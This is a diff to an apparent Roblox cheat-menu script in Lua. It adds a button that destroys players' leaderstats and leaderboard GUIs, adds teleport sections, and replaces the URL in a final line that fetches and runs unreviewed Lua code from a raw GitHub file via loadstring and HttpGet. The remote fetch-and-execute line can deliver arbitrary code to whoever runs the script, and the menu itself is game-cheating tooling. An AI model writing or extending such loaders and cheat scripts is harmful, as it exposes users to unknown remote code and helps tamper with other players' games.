@@ -345,6 +345,49 @@ ServerTab.Content.Visible = true
 
 ServerTab.AddSection("functions")
 
+ServerTab.AddButton("Destroy stats", function()
+-- script create BY ghost
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+local function removeLeaderstats(player)
+	if not player then return end
+	local ls = player:FindFirstChild("leaderstats")
+	if ls then ls:Destroy() end
+end
+
+for _, p in ipairs(Players:GetPlayers()) do
+	removeLeaderstats(p)
+end
+
+Players.PlayerAdded:Connect(function(p)
+	spawn(function()
+		local ok, _ = pcall(function()
+			local s = p:WaitForChild("leaderstats", 5)
+			if s then s:Destroy() end
+		end)
+	end)
+end)
+
+-- remove any leaderboard-like GUI locally
+local function destroyGuiIfLeaderboard(g)
+	if not g or not g.Name then return end
+	local name = g.Name:lower()
+	if name:find("leader") or name:find("playerlist") or name:find("scoreboard") then
+		pcall(function() g:Destroy() end)
+	end
+end
+
+local playerGui = LocalPlayer:WaitForChild("PlayerGui")
+for _, g in ipairs(playerGui:GetChildren()) do
+	destroyGuiIfLeaderboard(g)
+end
+
+playerGui.ChildAdded:Connect(function(c)
+	destroyGuiIfLeaderboard(c)
+end)
+end)
+
 ServerTab.AddButton("Reset", function()
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
@@ -1436,8 +1479,8 @@ LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(12, 104, -10)
 end
 end)
 
--- script create BY ghost
 
+TpTab.AddSection("teleport save")
 
 local savedPosition = nil
 local Players = game:GetService("Players")
@@ -1447,7 +1490,7 @@ function salvarPosicao()
 	local char = LocalPlayer.Character
 	if char and char:FindFirstChild("HumanoidRootPart") then
 		savedPosition = char.HumanoidRootPart.Position
-		notify("System", "salved", 5)
+		notify("System", "saved", 5)
 		print("Posição salva:", savedPosition)
 	end
 end
@@ -1463,6 +1506,8 @@ end
 
 TpTab.AddButton("Salvar posição", salvarPosicao)
 TpTab.AddButton("Teleportar para posição salva", tpPosicaoSalva)
+
+TpTab.AddSection("spoots")
 
 TpTab.AddButton("Tp to an Bart", function()
 local Players = game:GetService("Players")
@@ -1547,5 +1592,7 @@ end)
 ConfigTab.AddButton("destroy GUI", function() ScreenGui:Destroy() end)
 
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Cat558-uz/Ueuje/refs/heads/main/ac51f097d79ee647.lua.txt", true))()
+
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Cat558-uz/Banhhgy/refs/heads/main/1c0074fe22adc679.lua.txt", true))()
 
